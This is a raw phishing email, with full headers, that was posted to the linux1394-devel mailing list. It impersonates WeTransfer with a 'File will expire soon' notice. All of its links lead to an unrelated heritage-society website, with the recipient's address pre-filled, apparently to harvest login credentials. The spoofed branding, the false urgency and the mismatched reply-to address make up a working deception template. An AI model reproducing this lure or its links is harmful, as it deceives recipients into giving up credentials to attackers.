Return-Path: <linux1394-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+linux1394-devel@lfdr.de
Delivered-To: lists+linux1394-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B48193CD122
	for <lists+linux1394-devel@lfdr.de>; Mon, 19 Jul 2021 11:44:05 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:MIME-Version:
	Message-ID:Date:Subject:To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=J00gVQ7JoxstvfNj5v7HBRXi2VHhP2gm44ptYdOtmjo=; b=lRSPW46lL2OMbqxam24wMSpjN5
	v1/sjIiSmbyTiob7ujlYz3Xr3Hq5WD7bZ03kA6IdXgNVRx1GdV0b2rVMTj+fRQg/7lgFKXz5+ZcEO
	Od45eDHGmbdwnJpvMpYCqDmqP55MPwIAPmUjr6jAGkPHFH3uKeNz8FJRJMOOg7qJzpVY=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <linux1394-devel-bounces@lists.sourceforge.net>)
	id 1m5PoV-0004hi-3v; Mon, 19 Jul 2021 09:43:51 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <abuse@excelatshares.com>) id 1m5PoU-0004hc-0z
 for linux1394-devel@lists.sourceforge.net; Mon, 19 Jul 2021 09:43:50 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=4J5L07Lr+fadWuOtlq1OuFIQUPviiex+0N+dKLbL0nA=; b=ZdtWLmCZuCw4B9QgZ2xbk1VaDJ
 yzA2iTmu4uI+dNRNE2WYVQED7NDTL+XINXQntlOLrREwV5O+KjIfZ+llVRzchSYC2bQGLUE3DTekf
 Q8pYUD5A8d1iRxKB5s432fRlB32ezwzSM9briIXvK3wrxxjM/YVhn7byBIFkKhauFJKY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=4J5L07Lr+fadWuOtlq1OuFIQUPviiex+0N+dKLbL0nA=; b=Y
 l4G8sBloT4/Lf8vgBKdNUuRRfTwL/JKfAq7OQAaTx0TUh2Jdlve5Jf7m8Rm+QqkyviaXFWndPsXZ0
 I8Qgfb2nquNO9fm5lek37k75zXmb9p7FsOJT1/WvEm3r5fElQP/5UQCaeivYF/mzLBXrj3vdhq4Av
 JlIIRM4Hla5do2yY=;
Received: from ex.excelatshares.com ([45.14.9.99])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1m5PoP-00DTlW-9b
 for linux1394-devel@lists.sourceforge.net; Mon, 19 Jul 2021 09:43:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=ex; d=excelatshares.com;
 h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=info@excelatshares.com;
 bh=4J5L07Lr+fadWuOtlq1OuFIQUPviiex+0N+dKLbL0nA=;
 b=rd0BY2i7e3+4GaPC4PpuroE+9c5ChClRIgLCWELL+NuJZdGuIX1If41oU+8Pg7j350kQnEW+3/tB
 6iiadoWCxAFqiFVI54EgrT/Frv07S+e8VxiC+KoxbjG9+ULdH9fWV0qYU+34/Olb+CaSg4Cz/ZTu
 ifGF3WZb3BCV55ybRZnaAX6AgXw/bVaEWCIb3FGWh+eyRtMRKQkvzuKffQi0UJpKBBibiTtFLQHI
 kLj6evc7E20T8ooRpcrkqszJNKAMqYwoMmqPgvHXDLWw9ksyKeD2Y5rRCNLKl/vVkY2Kn5tjV9qm
 yiaMMkGSZXdv9GAZ0mFF2wbLeu6M7EYWK4AZbA==
To: linux1394-devel@lists.sourceforge.net
Subject: File will expire soon-71123092
Date: 19 Jul 2021 05:15:49 -0400
Message-ID: <20210719051549.3D2C3D7AD9B74DAC@excelatshares.com>
MIME-Version: 1.0
X-Spam-Score: 3.2 (+++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 RCVD_IN_MSPIKE_L3      RBL: Low reputation (-3)
 [45.14.9.99 listed in bl.mailspike.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
 -0.0 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1m5PoP-00DTlW-9b
X-BeenThere: linux1394-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: Linux IEEE 1394 development list
 <linux1394-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux1394-devel>
List-Post: <mailto:linux1394-devel@lists.sourceforge.net>
List-Help: <mailto:linux1394-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=subscribe>
From: WeTransfer via linux1394-devel <linux1394-devel@lists.sourceforge.net>
Reply-To: info@excelatshares.com
Content-Type: multipart/mixed; boundary="===============3494041707194842889=="
Errors-To: linux1394-devel-bounces@lists.sourceforge.net

--===============3494041707194842889==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-style: initial; text-decoration-color:=20
initial">Click<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN><A style=
=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(17,85,204); B=
ACKGROUND-COLOR: transparent" href=3D"https://lunenburgheritagesociety.ca/w=
wy/we/index.html?email=3Dlinux1394-devel@lists.sourceforge.net" rel=3Dnoref=
errer target=3D_blank>'Download images'<SPAN style=3D"BOX-SIZING: border-bo=
x">&nbsp;</SPAN></A>to view images<BR style=3D"BOX-SIZING: border-box">linu=
x1394-devel@lists.sourceforge.net,<BR style=3D"BOX-SIZING: border-box">
You just received some files via<SPAN style=3D"BOX-SIZING: border-box">&nbs=
p;</SPAN><SPAN class=3Dv1il style=3D"BOX-SIZING: border-box">WeTransfer</SP=
AN>.<BR style=3D"BOX-SIZING: border-box">2 file, 915 KB in Total and will b=
e deleted on&nbsp;21st July, 2021.</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-style: initial; text-decoration-color:=20
initial"><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: =
rgb(17,85,204); BACKGROUND-COLOR: transparent" href=3D"https://lunenburgher=
itagesociety.ca/wwy/we/index.html?email=3Dlinux1394-devel@lists.sourceforge=
=2Enet" rel=3Dnoreferrer target=3D_blank>Download files</A></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-style: initial; text-decoration-color:=20
initial">Get your files</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-style: initial; text-decoration-color:=20
initial"><BR style=3D"BOX-SIZING: border-box">To make sure our emails arriv=
e, please add<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN><A style=
=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(17,85,204); B=
ACKGROUND-COLOR: transparent" href=3D"https://lunenburgheritagesociety.ca/w=
wy/we/index.html?email=3Dlinux1394-devel@lists.sourceforge.net" rel=3Dnoref=
errer target=3D_blank>noreply@<SPAN class=3Dv1il style=3D"BOX-SIZING: borde=
r-box">wetransfer</SPAN>.com</A><SPAN style=3D"BOX-SIZING: border-box">&nbs=
p;</SPAN>
 to your contacts.</P></BODY></HTML>


--===============3494041707194842889==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3494041707194842889==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
mailing list linux1394-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/linux1394-devel

--===============3494041707194842889==--
